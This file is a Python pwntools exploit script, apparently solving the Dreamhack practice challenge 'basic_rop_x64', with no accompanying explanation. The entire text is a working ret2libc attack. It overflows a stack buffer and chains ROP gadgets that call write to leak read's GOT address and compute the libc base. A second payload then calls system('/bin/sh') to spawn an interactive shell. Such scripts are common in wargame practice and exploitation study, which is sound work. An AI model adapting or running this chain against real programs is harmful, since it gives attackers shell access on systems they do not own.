from pwn import *

p = process('./basic_rop_x64')
#p = remote("host3.dreamhack.games", 20091)
e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')
gdb.attach(p, api=True)

read_got = e.got['read']
read_plt = e.plt['read']
write_plt = e.plt['write']
main = e.symbols['main']
rdi = 0x0000000000400883
rsi_r15 = 0x0000000000400881
sh = next(libc.search(b'/bin/sh'))

payload = b'A'*(0x40+0x8)
payload += p64(rdi) + p64(1) + p64(rsi_r15) + p64(read_got) + p64(0) + p64(write_plt) #write(1, read_got,)
payload += p64(main)
p.send(payload)
p.recvuntil(b'A'*0x40)
read = u64(p.recvn(8))
libc_base = read - libc.symbols['read']
system = libc_base + libc.symbols['system']
binsh = libc_base + sh

log.info('read ' + hex(read))
log.info('libc_base ' + hex(libc_base))
log.info('system ' + hex(system))

payload = b'A'*(0x40+0x8)
payload += p64(rdi) + p64(binsh) + p64(system) #system("/bin/sh")

p.send(payload)

p.interactive()
